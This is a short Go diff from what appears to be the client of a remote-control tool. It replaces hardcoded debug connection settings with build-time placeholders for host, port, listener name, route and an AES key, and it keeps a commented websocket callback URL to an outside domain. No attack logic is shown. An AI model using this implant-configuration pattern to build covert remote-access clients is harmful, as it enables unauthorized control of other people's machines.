@@ -142,20 +142,21 @@ var ClientWorking bool
 func main() {
 
 	//release
-	// Host := "HostAAAABBBBCCCCDDDD"
-	// Port := "PortAAAABBBBCCCCDDDD"
-	// ListenerName := "ListenNameAAAABBBBCCCCDDDD"
-	// route := "RouteAAAABBBBCCCCDDDD"
-	// PcInfo.Host = strings.ReplaceAll(Host, " ", "")
-	// PcInfo.Port = strings.ReplaceAll(Port, " ", "")
-	// PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
+	Host := "HostAAAABBBBCCCCDDDD"
+	Port := "PortAAAABBBBCCCCDDDD"
+	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
+	route := "RouteAAAABBBBCCCCDDDD"
+	PcInfo.AesKey = "AeskAAAABBBBCCCC"
+	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
+	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
+	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
 	PcInfo.ClientComputer = GetClientComputer()
 	///Debug
-	Host := "192.168.244.141"
-	Port := "7000"
-	PcInfo.ListenerName = "dawd"
+	// Host := "192.168.244.141"
+	// Port := "7000"
+	// PcInfo.ListenerName = "dawd"
 
-	route := "www"
+	// route := "www"
 	// // //url := "ws://www.sftech.shop:443//www"
 
 	//url := "ws://127.0.0.1:80/Echo"
